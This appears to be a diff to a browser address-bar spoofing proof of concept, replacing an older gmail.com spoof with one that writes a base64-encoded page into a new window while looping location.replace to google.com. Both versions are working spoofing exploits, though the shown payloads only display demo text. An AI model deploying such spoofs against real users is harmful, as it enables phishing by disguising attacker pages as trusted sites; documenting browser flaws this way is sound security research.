@@ -1,9 +1,16 @@
-<a href="https://www.gmail.com:443."target="aa"
-onclick="setTimeout('fake()',100)"><h1>click me</h1></a>
-<script>
-function fake() {
-var t = window.open('javascript:alert(1)','aa');
-t.document.body.innerHTML = '<title>Gmail</title><H1>Fake Page!!!--hack by
-xisigr</H1>';
-}
-</script>
+<html>
+    <head>
+        <title>Address Bar Spoof!</title>
+    </head>
+    <body>
+        <script>
+            function demo() {
+            var evilPage = 'PGh0bWw+Cjx0aXRsZT4KZ29vZ2xlLmNvbQo8L3RpdGxlPgo8Ym9keT4KPGgzPkFkZHJlc3MgQmFyIFNwb29mIC1AQzBkM0czM2s8L2gzPgo8L2JvZHk+CjwvaHRtbD4=';
+                var x = window.open('','');
+                setInterval(function(){x.location.replace('https://www.google.com:8080');});
+                x.document.write(atob(evilPage));
+            }
+        </script>
+        <button onclick="demo();">test</button>
+    </body>
+</html>
